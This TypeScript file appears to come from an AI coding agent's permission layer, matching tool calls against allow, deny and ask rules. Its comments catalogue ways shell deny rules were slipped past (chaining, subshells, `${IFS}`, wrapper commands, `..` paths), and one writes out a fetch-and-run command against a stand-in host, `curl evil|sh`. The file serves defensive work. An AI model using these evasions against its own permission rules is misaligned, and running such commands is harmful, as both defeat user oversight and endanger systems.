



















import { loadSettings, saveSettings } from "../state/storage.js";
import { loadProjectPermissions } from "../utils/config.js";
import { PATH_INPUT_KEYS } from "../utils/toolUtils.js";

export type PermissionBehavior = "allow" | "deny" | "ask";


export interface ParsedRule {
  
  raw: string;
  
  toolName: string;
  
  ruleContent?: string;
  
  behavior: PermissionBehavior;
}


export interface MatchDecision {
  decision: PermissionBehavior;
  
  reason: string;
  
  rule: ParsedRule | null;
}




export function escapeRuleContent(content: string): string {
  return content
    .replace(/\\/g, "\\\\")
    .replace(/\(/g, "\\(")
    .replace(/\)/g, "\\)");
}


export function unescapeRuleContent(content: string): string {
  return content
    .replace(/\\\(/g, "(")
    .replace(/\\\)/g, ")")
    .replace(/\\\\/g, "\\");
}


function findFirstUnescapedChar(str: string, ch: string): number {
  for (let i = 0; i < str.length; i++) {
    if (str[i] === ch && countPrecedingBackslashes(str, i) % 2 === 0) {
      return i;
    }
  }
  return -1;
}


function findLastUnescapedChar(str: string, ch: string): number {
  for (let i = str.length - 1; i >= 0; i--) {
    if (str[i] === ch && countPrecedingBackslashes(str, i) % 2 === 0) {
      return i;
    }
  }
  return -1;
}

function countPrecedingBackslashes(str: string, index: number): number {
  let count = 0;
  let j = index - 1;
  while (j >= 0 && str[j] === "\\") {
    count++;
    j--;
  }
  return count;
}




export function parseRule(rule: string): { toolName: string; ruleContent?: string } {
  const trimmed = rule.trim();
  const openIdx = findFirstUnescapedChar(trimmed, "(");
  if (openIdx === -1) {
    
    return { toolName: trimmed };
  }

  const closeIdx = findLastUnescapedChar(trimmed, ")");
  
  if (closeIdx === -1 || closeIdx <= openIdx || closeIdx !== trimmed.length - 1) {
    return { toolName: trimmed };
  }

  const toolName = trimmed.substring(0, openIdx);
  const rawContent = trimmed.substring(openIdx + 1, closeIdx);

  
  if (!toolName) {
    return { toolName: trimmed };
  }

  
  if (rawContent === "" || rawContent === "*") {
    return { toolName };
  }

  return { toolName, ruleContent: unescapeRuleContent(rawContent) };
}


export function parseRules(
  rules: readonly string[],
  behavior: PermissionBehavior,
): ParsedRule[] {
  const out: ParsedRule[] = [];
  for (const raw of rules) {
    if (!raw || !raw.trim()) continue;
    const { toolName, ruleContent } = parseRule(raw);
    if (!toolName) continue;
    out.push({ raw: raw.trim(), toolName, ruleContent, behavior });
  }
  return out;
}




export function globToRegex(pattern: string, workingDir?: string): RegExp {
  let p = pattern;

  
  if (p === "~" || p.startsWith("~/")) {
    const home = process.env.HOME || process.env.USERPROFILE || "";
    p = p === "~" ? home : `${home}${p.slice(1)}`;
  }

  
  
  p = p.replace(/\\/g, "/");

  
  
  while (p.startsWith("./")) p = p.slice(2);
  if (p === ".") p = "";

  let re = "";
  let i = 0;
  while (i < p.length) {
    const c = p[i] as string;

    if (c === "*" && p[i + 1] === "*") {
      
      
      i += 2;
      if (p[i] === "/") i++;
      re += "(?:.*)";
      continue;
    }

    if (c === "*") {
      
      re += "[^/]*";
      i++;
      continue;
    }

    if (c === "?") {
      re += "[^/]";
      i++;
      continue;
    }

    if (c === "[") {
      
      const end = p.indexOf("]", i + 1);
      if (end === -1) {
        
        re += "\\[";
        i++;
        continue;
      }
      let cls = p.substring(i + 1, end);
      if (cls.startsWith("!")) cls = `^${cls.slice(1)}`; 
      
      cls = cls.replace(/\\/g, "\\\\").replace(/\]/g, "\\]");
      re += `[${cls}]`;
      i = end + 1;
      continue;
    }

    
    if (".+^${}()|".includes(c)) {
      re += `\\${c}`;
      i++;
      continue;
    }

    if (c === "/") {
      
      re += "[/\\\\]";
      i++;
      continue;
    }

    re += c;
    i++;
  }

  
  
  // A relative pattern is anchored to the working directory, because that is
  // the only thing that makes it a location. The separator belongs to the
  // anchor: at the filesystem root the base *is* the separator, so `/` must not
  // be doubled into `//`.
  const base = workingDir ? escapeRegex(stripTrailingSlash(workingDir)) : "";
  const anchored =
    workingDir && !pattern.startsWith("/") && !pattern.startsWith("~")
      ? base === "/"
        ? `\\/${re}`
        : `${base}[\\/\\\\]${re}`
      : re;

  return new RegExp(`^${anchored}$`, "s");
}

function escapeRegex(s: string): string {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function stripTrailingSlash(s: string): string {
  return s.length > 1 && s.endsWith("/") ? s.slice(0, -1) : s;
}


export function matchGlob(pattern: string, value: string, workingDir?: string): boolean {
  try {
    return globToRegex(pattern, workingDir).test(value);
  } catch {
    
    return false;
  }
}




export function matchShellCommand(pattern: string, command: string): boolean {
  const pat = pattern.trim();
  const cmd = command.trim();

  
  const prefixMatch = pat.match(/^(.+):\*$/);
  if (prefixMatch && prefixMatch[1] !== undefined) {
    const prefix = prefixMatch[1];
    return cmd === prefix || cmd.startsWith(`${prefix} `);
  }

  
  if (hasUnescapedWildcard(pat)) {
    return matchWildcardPattern(pat, cmd);
  }

  
  return cmd === pat;
}


/**
 * Split a shell command into the subcommands that will actually run, and report
 * whether that split can be trusted.
 *
 * RB-1: before this existed, a rule was matched against the whole command
 * string, so `Bash(git:*)` auto-approved `git status && rm -rf /tmp/evil` and a
 * `Bash(rm:*)` deny never fired behind `&&`/`;`/`|`. Splitting on the operators
 * and evaluating each subcommand is what makes both directions sound.
 *
 * `simple` is false when the command contains constructs whose runtime effect
 * cannot be modelled statically (command substitution, backticks — including
 * inside double quotes, where the shell still expands them — process
 * substitution, grouping, backgrounding, unbalanced quotes). Callers must fail
 * safe on those rather than guess.
 */
export function splitShellCommand(command: string): { simple: boolean; parts: string[] } {
  const parts: string[] = [];
  let current = "";
  let quote: '"' | "'" | null = null;
  let simple = true;

  for (let i = 0; i < command.length; i++) {
    const c = command[i] as string;

    if (quote) {
      current += c;
      if (c === "\\" && quote === '"' && i + 1 < command.length) {
        current += command[++i] as string;
        continue;
      }
      // Inside DOUBLE quotes the shell still expands `$(...)` and backticks, so
      // a quoted substitution runs a command the prefix match never saw:
      // `Bash(git status:*)` would vouch for `git status "$(curl evil|sh)"`.
      // Single quotes are literal, and an escaped `\$(`/`\`` is literal too —
      // both are handled above and correctly stay analysable.
      if (quote === '"' && (c === "`" || (c === "$" && command[i + 1] === "("))) {
        simple = false;
      }
      if (c === quote) quote = null;
      continue;
    }

    if (c === '"' || c === "'") {
      quote = c;
      current += c;
      continue;
    }

    if (c === "\\") {
      current += c;
      if (i + 1 < command.length) current += command[++i] as string;
      continue;
    }

    // Constructs we cannot reason about: the real command may be produced at
    // runtime, so no static split can be complete. Each one is a boundary
    // between commands, so the part is closed here rather than glued to its
    // neighbours.
    //
    // Gluing is what made an explicit deny miss: `git status; (rm -rf X)`
    // came back as one part `(rm -rf X)`, which matches no rule written for
    // `rm`, and the fallback below — matching the whole raw string — did not
    // either. Deny and ask consult these parts, so a construct that cannot be
    // modelled now yields the command inside it instead of hiding it.
    if (c === "`") { simple = false; parts.push(current); current = ""; continue; }
    if (c === "$" && command[i + 1] === "(") { simple = false; parts.push(current); current = ""; i++; continue; }
    if ((c === "<" || c === ">") && command[i + 1] === "(") { simple = false; parts.push(current); current = ""; i++; continue; }
    if (c === "(" || c === ")" || c === "!") {
      simple = false;
      parts.push(current);
      current = "";
      continue;
    }
    // Braces are NOT a split point: `${HOME}` is a parameter expansion whose
    // path the dangerous-command check has to read whole — cutting it into `$`
    // and `HOME` stops `rm -rf ${HOME}` being recognised as the delete it is.
    // Brace *grouping* (`{ rm -rf X; }`) needs no help here, because the `;`
    // inside it already splits.
    if (c === "{" || c === "}") simple = false;

    // `${IFS}` and `$IFS` expand to whitespace, so `rm${IFS}-rf${IFS}/tmp/x`
    // is `rm -rf /tmp/x` to the shell — matched literally it names no command
    // at all, and a `Bash(rm:*)` deny walked straight past it. Expand to a
    // space. The spelling still varies with the environment, so the result is
    // not analysable and may never auto-allow.
    if (c === "$") {
      const braced = command.startsWith("{IFS}", i + 1);
      const bare =
        !braced &&
        command.startsWith("IFS", i + 1) &&
        !/[A-Za-z0-9_]/.test(command[i + 4] ?? "");
      if (braced || bare) {
        simple = false;
        current += " ";
        i += braced ? 5 : 3;
        continue;
      }
    }

    if (c === "\n" || c === ";") {
      parts.push(current);
      current = "";
      continue;
    }

    if (c === "&" || c === "|") {
      const next = command[i + 1];
      if (next === "&" || next === "|") {
        parts.push(current);
        current = "";
        i++;
        continue;
      }
      // A lone `&` backgrounds the command; a lone `|` pipes into the next.
      if (c === "&") simple = false;
      parts.push(current);
      current = "";
      continue;
    }

    current += c;
  }

  if (quote) simple = false;
  parts.push(current);

  const cleaned = parts.map((p) => p.trim()).filter((p) => p.length > 0);
  if (cleaned.length === 0) simple = false;
  return { simple, parts: cleaned };
}

/** Wrapper commands that exec their arguments as the command to run. Leading
 *  ones are stripped before a deny or ask rule is matched, so `nice rm -rf X`
 *  is seen as what it is. Over-stripping is the safe direction here — it makes
 *  an explicit deny fire more often, and a rule naming a wrapper itself rather
 *  than what it wraps is vanishingly rare. */
const WRAPPER_RES = [
  // `timeout 5 cmd`, `timeout --kill-after=5 10s cmd`
  /^timeout(?:[ \t]+--?[A-Za-z-]+=[^ \t]+)*[ \t]+(?:--[ \t]+)?\d+(?:\.\d+)?[smhd]?[ \t]+/,
  /^time(?:[ \t]+--)?[ \t]+/,
  /^nice(?:[ \t]+-n[ \t]+-?\d+|[ \t]+-\d+)?[ \t]+/,
  /^stdbuf(?:[ \t]+-[ioe][LN0-9]+)*[ \t]+/,
  /^(?:nohup|command|env|exec|builtin)[ \t]+/,
] as const;

/** An env assignment in front of a command: `FOO=1 rm -rf X` runs `rm`.
 *  Distinct from ENV_ASSIGN_RE below, which matches a whole token. */
const LEADING_ENV_ASSIGN_RE = /^[A-Za-z_][A-Za-z0-9_]*=[^ \t]*[ \t]+/;

/**
 * Peel the shell decoration off a subcommand so a rule written for the command
 * itself matches it: the separators and subshell punctuation the split leaves
 * on either end, a leading env assignment, and any leading wrapper.
 *
 * Quotes are deliberately not peeled. `echo "rm -rf X"` is not a call to `rm`,
 * and stripping the quotes to find one would turn every harmless mention of a
 * denied command into a denial.
 */
export function stripShellDecoration(part: string): string {
  let s = part.trim();
  for (;;) {
    const before = s;
    s = s.replace(/^[;&|`(){}$!]+/, "");
    s = s.replace(LEADING_ENV_ASSIGN_RE, "");
    for (const re of WRAPPER_RES) s = s.replace(re, "");
    s = s.replace(/[\s)}`]+$/, "");
    s = s.trim();
    if (s === before) return s;
  }
}

/**
 * Match one shell rule against a command, per subcommand (RB-1).
 *
 * - allow: fires only when the command is fully analysable AND every
 *   subcommand matches. A rule that covers `git` alone must not vouch for what
 *   is chained after it.
 * - deny/ask: fires when ANY subcommand matches.
 * - Unanalysable commands never auto-allow. For deny/ask they are matched
 *   against every subcommand the splitter could still find, in raw and
 *   decoration-stripped form, on top of the whole string.
 *
 * The last point is load-bearing. The splitter cannot model command
 * substitution, grouping, backgrounding and the wrapper commands, and the
 * whole-string match alone almost never fires — a rule for `rm` does not match
 * a string that starts with `git status`. So "cannot model" was not a refusal
 * to guess, it was a hole: every one of
 *
 *     git status & rm -rf X      git status; (rm -rf X)
 *     git status; $(rm -rf X)    git status; `rm -rf X`
 *     ! rm -rf X                 FOO=1 rm -rf X
 *     nice rm -rf X              command rm -rf X
 *     rm${IFS}-rf${IFS}X
 *
 * ran the command with an explicit `Bash(rm:*)` deny in settings and no prompt
 * to the user. Denying on the parts the splitter did find, and on those parts
 * with their decoration peeled, closes all nine. Constructs that still defeat
 * this — `eval "rm -rf X"`, `sh -c "rm -rf X"` — need the command actually
 * resolved, which is the reference's AST pass and is not attempted here.
 */
export function matchShellRule(
  pattern: string,
  command: string,
  behavior: PermissionBehavior,
): boolean {
  const { simple, parts } = splitShellCommand(command);
  if (simple) {
    if (behavior === "allow") {
      // Deliberately no decoration-stripping on the allow side: `nice rm -rf X`
      // is not obviously the command a `Bash(rm:*)` rule vouched for, and the
      // cost of being wrong is an unapproved execution. It falls to a prompt.
      return parts.length > 0 && parts.every((p) => matchShellCommand(pattern, p));
    }
    return parts.some((p) => matchShellCommand(pattern, p) || matchesStripped(pattern, p));
  }
  if (behavior === "allow") return false;
  if (matchShellCommand(pattern, command)) return true;
  return parts.some((p) => matchShellCommand(pattern, p.trim()) || matchesStripped(pattern, p));
}

/** The pattern, against a subcommand with its shell decoration peeled off. */
function matchesStripped(pattern: string, part: string): boolean {
  const stripped = stripShellDecoration(part);
  return stripped.length > 0 && matchShellCommand(pattern, stripped);
}


function hasUnescapedWildcard(pattern: string): boolean {
  if (pattern.endsWith(":*")) return false;
  for (let i = 0; i < pattern.length; i++) {
    if (pattern[i] === "*" && countPrecedingBackslashes(pattern, i) % 2 === 0) {
      return true;
    }
  }
  return false;
}



const ESCAPED_STAR = "\x00STAR\x00";
const ESCAPED_BACKSLASH = "\x00BSLASH\x00";
const STAR_RE = new RegExp(ESCAPED_STAR, "g");
const BSLASH_RE = new RegExp(ESCAPED_BACKSLASH, "g");


export function matchWildcardPattern(pattern: string, command: string): boolean {
  const pat = pattern.trim();

  
  let processed = "";
  let i = 0;
  while (i < pat.length) {
    const c = pat[i] as string;
    if (c === "\\" && i + 1 < pat.length) {
      const next = pat[i + 1];
      if (next === "*") {
        processed += ESCAPED_STAR;
        i += 2;
        continue;
      }
      if (next === "\\") {
        processed += ESCAPED_BACKSLASH;
        i += 2;
        continue;
      }
    }
    processed += c;
    i++;
  }

  
  const escaped = processed.replace(/[.+?^${}()|[\]\\'"]/g, "\\$&");
  const withWildcards = escaped.replace(/\*/g, ".*");

  let regexPattern = withWildcards
    .replace(STAR_RE, "\\*")
    .replace(BSLASH_RE, "\\\\");

  
  const unescapedStarCount = (processed.match(/\*/g) || []).length;
  if (regexPattern.endsWith(" .*") && unescapedStarCount === 1) {
    regexPattern = regexPattern.slice(0, -3) + "( .*)?";
  }

  try {
    return new RegExp(`^${regexPattern}$`, "s").test(command);
  } catch {
    return false;
  }
}




function extractSubjects(
  toolName: string,
  input: Record<string, unknown>,
  workingDir: string,
): { kind: "path" | "shell" | "domain" | "generic"; values: string[] } {
  const tn = toolName.toLowerCase();

  if (tn === "bash" || tn === "bashoutput") {
    const cmd = pickString(input, ["command", "cmd"]) ?? "";
    return { kind: "shell", values: [cmd] };
  }

  // WebFetch rules match on the URL's hostname (rule content "domain:<host>").
  if (tn === "webfetch") {
    const url = pickString(input, ["url"]);
    if (url) {
      try {
        const hostname = new URL(url).hostname;
        if (hostname) return { kind: "domain", values: [hostname] };
      } catch {
        // Malformed URL — fall through to the generic matcher.
      }
    }
  }

  
  
  
  const concretePaths = pickStrings(input, [...PATH_INPUT_KEYS]);
  if (concretePaths.length > 0) {
    return {
      kind: "path",
      values: concretePaths.map((p) => resolveAgainst(workingDir, p)),
    };
  }

  if (tn === "glob" || tn === "grep") {
    const pats = pickStrings(input, ["pattern", "glob", "path_pattern", "path"]);
    if (pats.length > 0) {
      return { kind: "generic", values: pats };
    }
  }

  const strs: string[] = [];
  for (const v of Object.values(input)) {
    if (typeof v === "string") strs.push(v);
  }
  strs.push(JSON.stringify(input));
  return { kind: "generic", values: strs };
}

function pickString(obj: Record<string, unknown>, keys: string[]): string | undefined {
  for (const k of keys) {
    const v = obj[k];
    if (typeof v === "string" && v.length > 0) return v;
  }
  return undefined;
}

function pickStrings(obj: Record<string, unknown>, keys: string[]): string[] {
  const out: string[] = [];
  for (const k of keys) {
    const v = obj[k];
    if (typeof v === "string" && v.length > 0) out.push(v);
  }
  return out;
}

function resolveAgainst(workingDir: string, p: string): string {
  if (p === "~" || p.startsWith("~/")) {
    const home = process.env.HOME || process.env.USERPROFILE || "";
    const expanded = p === "~" ? home : `${home}${p.slice(1)}`;
    return canonicalize(expanded);
  }
  if (p.startsWith("/")) return canonicalize(p);
  
  const base = stripTrailingSlash(workingDir);
  return canonicalize(`${base}/${p}`);
}


function canonicalize(p: string): string {
  const isAbsolute = p.startsWith("/");
  const parts = p.split("/");
  const out: string[] = [];
  for (const seg of parts) {
    if (seg === "." || seg === "") continue;
    if (seg === "..") {
      // RB-2: `..` must be collapsed lexically. Leaving it in the subject let a
      // deny rule for /a/b/c be evaded with /a/b/../c — the same real file, a
      // different string — and the deny degraded to "ask" (which headless
      // auto-approves). Never pop past the root, and keep leading `..` on a
      // relative path since those are genuinely outside the base.
      if (out.length > 0 && out[out.length - 1] !== "..") out.pop();
      else if (!isAbsolute) out.push("..");
      continue;
    }
    out.push(seg);
  }
  const joined = out.join("/");
  if (isAbsolute) return joined ? `/${joined}` : "/";
  return joined || ".";
}


export function matchToolInput(
  rule: ParsedRule,
  toolName: string,
  input: Record<string, unknown>,
  workingDir: string,
): boolean {
  
  if (rule.toolName !== "*" && rule.toolName.toLowerCase() !== toolName.toLowerCase()) {
    return false;
  }

  
  if (!rule.ruleContent) return true;

  const { kind, values } = extractSubjects(toolName, input, workingDir);
  const pat = rule.ruleContent;

  for (const v of values) {
    if (kind === "shell") {
      if (matchShellRule(pat, v, rule.behavior)) return true;
    } else if (kind === "path") {

      // `~` is expanded here so the pattern is absolute and stops looking
      // relative; everything else is handed to the matcher as written, with
      // the working directory passed along so a relative rule is anchored to
      // it. Subjects are always absolute (extractSubjects resolves them), so
      // without that argument `deny: ["Edit(.git/**)"]` compiled to
      // `^\.git[/\\](?:.*)$` and matched nothing — a security rule that fails
      // open and reports nothing.
      const expandedPat =
        pat === "~" || pat.startsWith("~/")
          ? resolveAgainst(workingDir, pat)
          : pat;
      if (matchGlob(expandedPat, v, workingDir)) return true;
    } else if (kind === "domain") {
      // Rule content is "domain:<host>" (optionally a wildcard like "*.example.com").
      const domain = pat.startsWith("domain:") ? pat.slice("domain:".length) : pat;
      if (hasUnescapedWildcard(domain) || domain.includes("*")) {
        if (matchWildcardPattern(domain, v)) return true;
      } else if (v === domain) {
        return true;
      }
    } else {

      if (hasUnescapedWildcard(pat) || pat.includes("*")) {
        if (matchWildcardPattern(pat, v)) return true;
      } else if (v.includes(pat)) {
        return true;
      }
    }
  }
  return false;
}




export function matchDecision(
  rules: readonly ParsedRule[],
  toolName: string,
  inputJson: unknown,
  workingDir: string,
): MatchDecision {
  const input = coerceInput(inputJson);

  let matchedDeny: ParsedRule | null = null;
  let matchedAsk: ParsedRule | null = null;
  let matchedAllow: ParsedRule | null = null;

  for (const rule of rules) {
    if (matchToolInput(rule, toolName, input, workingDir)) {
      if (rule.behavior === "deny" && !matchedDeny) matchedDeny = rule;
      else if (rule.behavior === "ask" && !matchedAsk) matchedAsk = rule;
      else if (rule.behavior === "allow" && !matchedAllow) matchedAllow = rule;
    }
  }

  if (matchedDeny) {
    return {
      decision: "deny",
      rule: matchedDeny,
      reason: ruleReason(matchedDeny, "deny"),
    };
  }
  if (matchedAsk) {
    return {
      decision: "ask",
      rule: matchedAsk,
      reason: ruleReason(matchedAsk, "ask"),
    };
  }
  if (matchedAllow) {
    return {
      decision: "allow",
      rule: matchedAllow,
      reason: ruleReason(matchedAllow, "allow"),
    };
  }

  return {
    decision: "ask",
    rule: null,
    reason: `No permission rule matched for ${toolName}; defaulting to ask.`,
  };
}

function coerceInput(inputJson: unknown): Record<string, unknown> {
  if (inputJson && typeof inputJson === "object" && !Array.isArray(inputJson)) {
    return inputJson as Record<string, unknown>;
  }
  if (typeof inputJson === "string") {
    try {
      const parsed = JSON.parse(inputJson);
      if (parsed && typeof parsed === "object" && !Array.isArray(parsed)) {
        return parsed as Record<string, unknown>;
      }
    } catch {
      
    }
  }
  return {};
}

function ruleReason(rule: ParsedRule, behavior: PermissionBehavior): string {
  const verb = behavior === "allow" ? "allowed by" : behavior === "deny" ? "denied by" : "prompted by";
  const target = rule.ruleContent ? `${rule.toolName}(${rule.ruleContent})` : rule.toolName;
  return `${verb} rule: ${target}`;
}




export interface PermissionSettings {
  allow?: readonly string[];
  deny?: readonly string[];
  ask?: readonly string[];
}

export function parsePermissionSettings(permissions: {
  allow?: readonly string[];
  deny?: readonly string[];
  ask?: readonly string[];
}): ParsedRule[] {
  return [
    ...parseRules(permissions.allow ?? [], "allow"),
    ...parseRules(permissions.ask ?? [], "ask"),
    ...parseRules(permissions.deny ?? [], "deny"),
  ];
}

/**
 * Union of the rule sets that govern a tool call.
 *
 * Concatenated rather than overridden, because `matchDecision` resolves by
 * behavior first — deny, then ask, then allow — so a deny in either set beats
 * an allow in the other. That direction is the one that matters: `allow:
 * ["Bash"]` in a workspace config must not lift a deny the user wrote.
 *
 * Duplicates are dropped per behavior: the same rule in both scopes is one
 * rule. An allow and a deny that read alike are not duplicates and both stay.
 */
export function mergePermissions(
  ...sets: readonly (PermissionSettings | null | undefined)[]
): PermissionSettings {
  const out: { allow: string[]; ask: string[]; deny: string[] } = { allow: [], ask: [], deny: [] };
  for (const set of sets) {
    if (!set) continue;
    for (const behavior of ["allow", "ask", "deny"] as const) {
      for (const rule of set[behavior] ?? []) {
        if (typeof rule === "string" && rule.trim() && !out[behavior].includes(rule)) {
          out[behavior].push(rule);
        }
      }
    }
  }
  return out;
}

/**
 * Every rule that governs this workspace right now: the user's settings, plus
 * the workspace's own config when the workspace is trusted.
 *
 * The workspace half used to be written and never read. `/permissions` offered
 * a "Project settings" destination that stored rules in `.deepseek-code.json`,
 * so a project deny rule — the security-relevant case, the one a team writes to
 * protect a directory — was saved, displayed as saved, and enforced nothing.
 *
 * Callers must pass the directory rules are matched against: it is the same
 * directory the workspace config lives in, and the same one the trust decision
 * is made about.
 */
export function loadEffectivePermissions(dir: string = process.cwd()): PermissionSettings {
  let user: PermissionSettings | undefined;
  try {
    user = loadSettings().permissions;
  } catch {
    // Unreadable user settings are no reason to drop the workspace's rules.
  }
  return mergePermissions(user, loadProjectPermissions(dir));
}

/* ------------------------------------------------------------------ */
/* Prompt-facing helpers (persist, explanation, path + bash utilities) */
/* ------------------------------------------------------------------ */

/** Best-effort persist of a `ToolName(content)` allow rule into the user
 *  settings (deduped). A failed persist must not crash the caller. */
export function persistAllowRule(rule: string): void {
  try {
    const settings = loadSettings();
    const allow = settings.permissions?.allow ?? [];
    if (!allow.includes(rule)) {
      saveSettings({
        ...settings,
        permissions: {
          ...settings.permissions,
          allow: [...allow, rule],
        },
      });
    }
  } catch {
    // A failed persist must not crash the prompt dialog.
  }
}

/** Format a parsed rule for display, e.g. `Bash(npm run:*)`. */
export function formatRuleForDisplay(rule: ParsedRule): string {
  return rule.ruleContent ? `${rule.toolName}(${rule.ruleContent})` : rule.toolName;
}

/** Dim explanation line for a prompt raised by a matched ask rule, or null
 *  when the decision came from elsewhere (no rule, deny/allow). */
export function permissionRuleExplanation(decision: MatchDecision): string | null {
  if (decision.decision !== "ask" || !decision.rule) return null;
  return `Permission rule ${formatRuleForDisplay(decision.rule)} requires confirmation for this tool. /permissions to update rules`;
}

/** Case-insensitive "path is inside folder" check with a separator boundary
 *  (macOS/Windows filesystems are case-insensitive, so `.cLauDe/Settings.json`
 *  must count as inside `.claude/`). The folder itself is NOT inside. */
export function isPathInFolder(path: string, folder: string): boolean {
  const p = path.toLowerCase();
  const f = folder.toLowerCase();
  return p.startsWith(f + "/") || p.startsWith(f + "\\");
}

/** True when `path` is the working path itself or lives underneath it.
 *  Normalizes the macOS /var -> /private/var and /tmp -> /private/tmp
 *  symlinks and compares case-insensitively so resolved input paths match
 *  an unresolved working directory. */
export function pathInWorkingPath(path: string, workingPath: string): boolean {
  const normalize = (p: string) =>
    p
      .replace(/^\/private\/var\//, "/var/")
      .replace(/^\/private\/tmp(\/|$)/, "/tmp$1")
      .toLowerCase();
  const p = normalize(path);
  const w = normalize(workingPath);
  if (p === w) return true;
  if (p.startsWith(w + "/") || p.startsWith(w + "\\")) return true;
  return false;
}

/** Clamp multi-line text to `maxLines`, appending an ellipsis when truncated. */
export function clampLines(text: string, maxLines: number): string {
  const lines = text.split("\n");
  if (lines.length <= maxLines) return text;
  return `${lines.slice(0, maxLines).join("\n")}\n…`;
}

const REDIRECTION_RE = /\s*[12]?>>?(\s*&[12]|\s*[^\s|;&]*)/g;

/** Strip output redirections (`> f`, `2>&1`, `>> log`) so filenames don't
 *  show up as part of a suggested command prefix. */
export function stripBashRedirections(command: string): string {
  return command.replace(REDIRECTION_RE, "").trim();
}

/** Command-name shape: lowercase letters/digits with optional `-` segments
 *  (e.g. `npm`, `git`, `docker-compose`). */
const COMMAND_NAME_RE = /^[a-z][a-z0-9]*(-[a-z0-9]+)*$/;
const ENV_ASSIGN_RE = /^[A-Za-z_][A-Za-z0-9_]*=/;

/** Shells/wrappers a bare one-word prefix rule would over-permit (a `bash:*`
 *  rule auto-approves arbitrary code via `bash -c`, `sudo:*` any sudo call). */
const BARE_SHELL_PREFIXES = new Set([
  "sh", "bash", "zsh", "fish", "csh", "tcsh", "ksh", "dash", "cmd",
  "powershell", "pwsh", "env", "xargs", "nice", "stdbuf", "nohup",
  "timeout", "time", "sudo", "doas", "pkexec",
]);

/** Suggest a stable command prefix for a "don't ask again" Bash rule.
 *  Strips redirections first; prefers the two-word subcommand form
 *  (`npm run`), falls back to the bare command (`git`), and declines for
 *  paths, flags, bare shells, and empty input. */
export function suggestBashPrefix(command: string): string | null {
  const tokens = stripBashRedirections(command).split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return null;

  // Skip leading env-var assignments (NODE_ENV=prod npm run build).
  let i = 0;
  while (i < tokens.length && ENV_ASSIGN_RE.test(tokens[i]!)) i++;
  const rest = tokens.slice(i);
  if (rest.length === 0) return null;

  // Two words when the second looks like a subcommand ("commit", "run", ...).
  if (rest.length >= 2 && COMMAND_NAME_RE.test(rest[1]!)) {
    return `${rest[0]} ${rest[1]}`;
  }

  const first = rest[0]!;
  if (!COMMAND_NAME_RE.test(first)) return null;
  if (BARE_SHELL_PREFIXES.has(first)) return null;
  return first;
}
